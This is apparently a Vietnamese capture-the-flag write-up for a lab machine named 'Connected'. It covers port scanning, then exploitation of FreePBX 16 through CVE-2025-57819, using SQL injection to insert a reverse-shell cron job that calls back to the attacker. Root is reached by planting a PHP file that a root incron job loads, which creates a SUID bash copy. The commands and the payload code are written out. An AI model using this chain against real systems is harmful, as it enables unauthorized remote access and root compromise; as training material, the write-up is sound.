# Connected

<figure><img src="../../.gitbook/assets/image (847).png" alt=""><figcaption></figcaption></figure>



## RECON

### Scan Port

sau khi quét 65k port thì ta có được 3 port đang mở là 22,80 và 443

```bash
(base) ┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.129.16.18 -r0-65000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimiarm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed.r image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.16.18:22
Open 10.129.16.18:80
Open 10.129.16.18:443
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-06 23:17 -0400
Initiating Ping Scan at 23:17
Scanning 10.129.16.18 [4 ports]
Completed Ping Scan at 23:17, 0.32s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:17
Completed Parallel DNS resolution of 1 host. at 23:17, 0.51s elapsed
DNS resolution of 1 IPs took 0.52s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 23:17
Scanning 10.129.16.18 [3 ports]
Discovered open port 443/tcp on 10.129.16.18
Discovered open port 22/tcp on 10.129.16.18
Discovered open port 80/tcp on 10.129.16.18
Completed SYN Stealth Scan at 23:17, 0.29s elapsed (3 total ports)
Nmap scan report for 10.129.16.18
Host is up, received echo-reply ttl 63 (0.28s latency).
Scanned at 2026-06-06 23:17:26 EDT for 1s

PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)

```



sau khi chạy script mặc định thì ta có được 1 số thông tin như ở port  80 là rediect sang 1 domain , và web này sử dụng centos để host

```bash
(base) ┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p22,80,443 10.129.16.18
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-06 23:17 -0400
Nmap scan report for 10.129.16.18
Host is up (0.27s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: Did not follow redirect to http://connected.htb/
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.15 seconds

```



### Foothold

<figure><img src="../../.gitbook/assets/image (848).png" alt=""><figcaption></figcaption></figure>

Khi truy cập vào trang cms thì ta thấy được thông tin về version của nó , ta hoàn toàn có thể đoán là , bài này sẽ sử dụng CVE để RCE&#x20;



<figure><img src="../../.gitbook/assets/image (849).png" alt=""><figcaption></figcaption></figure>

```
FreePBX 16.0.40.7 is licensed under the GPL
```



<figure><img src="../../.gitbook/assets/image (850).png" alt=""><figcaption></figcaption></figure>





## RCE

[https://github.com/b4sh2/CVE-2025-57819-poc/tree/main](https://github.com/b4sh2/CVE-2025-57819-poc/tree/main)



```bash
                                                                                           (base) ┌──(kali㉿kali)-[~/conectted/CVE-2025-57819-poc]
└─$ python3 exploit.py  http://connected.htb --ip 10.10.15.155

[*] Listener address: 10.10.15.155:4444 (iface tun0)
[*] Confirming SQLi on http://connected.htb ...
[+] Vulnerable! DB version: 5.5.65-MariaDB
[*] Listening on 0.0.0.0:4444
[*] Injecting reverse-shell cron job ...
[+] Cron job 'jkmvlrtn' inserted (runs every minute).
[*] Waiting for callback (up to ~70s) ...
id
[+] Shell from 10.129.18.238:36344 !
[+] Removed cron job 'jkmvlrtn' (no repeat callbacks).
--- interactive shell (Ctrl-C to quit) ---
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \ 
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
NOTICE! You have 3 notifications! Please log into the UI to see them!
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | A2:DE:AD:96:E3:D5 | 10.129.18.238             |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

< 'import pty;pty.spawn("/bin/bash")' 2>/dev/null || /bin/bash -i            
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /                                             
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V /                                              
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \                                              
| |    | |   |  __/|  __/| |    | |_/ // /^\ \                                             
\_|    |_|    \___| \___|\_|    \____/ \/   \/                                             
                                                                                           
                                                                                           
NOTICE! You have 3 notifications! Please log into the UI to see them!                      
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | A2:DE:AD:96:E3:D5 | 10.129.18.238             |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

[asterisk@connected ~]$ id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
[asterisk@connected ~]$ 
```

Ta thửu liệt kê file ở thư mục home của user , và ta có được file `user.txt`

```bash
[asterisk@connected ~]$ ls -lia
ls -lia
total 28
9221794 drwxr-xr-x. 10 asterisk asterisk 274 Jun  4 11:23 .
8416299 drwxr-xr-x.  3 root     root      22 May 21 07:50 ..
8409167 -rw-------   1 asterisk asterisk  13 Jun  4 11:24 .asterisk_history
8409156 -rw-------   1 asterisk asterisk   8 Jun  4 11:24 .bash_history
9289516 -rw-r--r--.  1 asterisk asterisk  18 Dec  6  2016 .bash_logout
9289517 -rw-r--r--.  1 asterisk asterisk 193 Dec  6  2016 .bash_profile
9289518 -rw-r--r--.  1 asterisk asterisk 231 Dec  6  2016 .bashrc
8409180 drwxrwxr-x   3 asterisk asterisk  18 Jun  4 11:23 .cache
9289519 drwxr-xr-x.  4 asterisk asterisk  37 Jun  4 11:23 .config
2250207 drwxrwxr-x.  2 asterisk asterisk  83 Nov 30  2025 .gnupg
5070209 drwxr-xr-x.  4 asterisk asterisk  28 Nov 30  2025 .node
9289520 drwxr-xr-x.  3 asterisk asterisk  20 Nov 30  2025 .node-gyp
5070384 drwxr-xr-x.  5 asterisk asterisk  86 Nov 30  2025 .npm
9371608 -rw-r--r--.  1 asterisk asterisk  18 Nov 30  2025 .npmrc
8409169 -rw-r--r--   1 asterisk asterisk   0 May 19 18:41 .odbc.ini
9371609 drwxr-xr-x.  3 asterisk asterisk  17 Nov 30  2025 .package_cache
5258685 drwxrwxr-x.  5 asterisk asterisk 165 Nov 30  2025 .pm2
1599683 -rw-r-----   1 root     asterisk  33 Jun  8 07:25 user.txt
```



### User.txt

```bash
[asterisk@connected ~]$ cat user.txt
62b7913db1f8b05872b729e6978abb87
```





## Privilege Escalation



Sau khi có shell user `asterisk`, chúng ta đối mặt với một hệ thống không có lỗ hổng Kernel và không có quyền `sudo`. Logic leo quyền được thực hiện qua 4 bước phân tích:



Trong Linux, khi các quyền cơ bản (SUID, Sudo) bị thắt chặt, hướng tấn công tiếp theo luôn là **Scheduled Tasks** .

* **Lệnh kiểm tra:** `ls -la /etc/incron.d`
* **Phát hiện quan trọng:** File `/etc/incron.d/legacy` chứa dòng: `/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha`
* **Đối tượng:** File `/usr/local/asterisk/ha_trigger`.
* **Sự kiện:** `IN_CLOSE_WRITE` (Khi một file được ghi xong và đóng lại).
* **Hành động:** Chạy `/usr/sbin/sysadmin_ha`.
* **Quyền hạn:** Vì incron daemon chạy dưới quyền **root**, nên script `sysadmin_ha` cũng sẽ chạy với quyền **root**.



Chúng ta xem nội dung của script `/usr/sbin/sysadmin_ha` (đây là một script PHP):

```php
<?php
// ... (omitted)
$i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
if (file_exists($i)) {
    require_once($i); 
    $incron = new incron;
    $incron->rootTrigger();
}
```

* **Lỗ hổng Logic:** Script này chạy với quyền **root**, nhưng nó lại tự động nạp (`require_once`) một file PHP nằm trong thư mục Web (`/var/www/html/...`).
* **Kiểm tra quyền hạn:** `ls -ld /var/www/html/admin/modules/`
  * Kết quả cho thấy user `asterisk` có quyền ghi (`rwxrwxr-x`) vào thư mục này.
* **Kết luận:** Nếu chúng ta (user `asterisk`) tạo ra file `incron.php` tại đúng đường dẫn đó, script root sẽ thực thi bất kỳ mã nào chúng ta viết bên trong.



Mục tiêu của chúng ta là tạo ra một điểm truy cập root bền vững. Cách nhanh nhất là tạo một bản sao của `/bin/bash` và đặt quyền **SUID**.

1.  **Tạo thư mục:**

    ```bash
    mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc
    ```
2.  **Tạo "bẫy" PHP (`incron.php`):**

    ```php
    <?php
    class incron {
        public function rootTrigger() {
            // Copy shell bash ra /tmp
            system("cp /bin/bash /tmp/rootbash");
            // Đặt quyền SUID (Số 4 ở đầu) để khi chạy, nó thực thi với quyền của chủ sở hữu (root)
            system("chmod 4755 /tmp/rootbash");
        }
    }
    ?>
    ```

    * **Tại sao phải dùng Class?** Vì script `/usr/sbin/sysadmin_ha` yêu cầu `new incron` và gọi hàm `rootTrigger()`. Chúng ta phải viết đúng cấu trúc Class để không gây lỗi PHP.



Bây giờ mọi thứ đã sẵn sàng, chúng ta chỉ cần tạo ra sự kiện mà `incron` đang chờ đợi:

1.  **Lệnh kích hoạt:**

    ```bash
    echo "pwned" > /usr/local/asterisk/ha_trigger
    ```
2. **Diễn biến ngầm:**
   * `incron daemon` phát hiện file `ha_trigger` vừa được đóng sau khi ghi.
   * Nó gọi `/usr/sbin/sysadmin_ha` với quyền **root**.
   * `sysadmin_ha` thấy file `incron.php` ta vừa tạo, nó nạp vào bộ nhớ.
   * Nó khởi tạo class `new incron` và chạy hàm `rootTrigger()`.
   * Lệnh `cp` và `chmod` được thực thi bởi **root**.
3.  **Lấy Flag :** Sử dụng file SUID vừa tạo:

    ```bash
    /tmp/rootbash -p -c 'cat /root/root.txt'
    ```

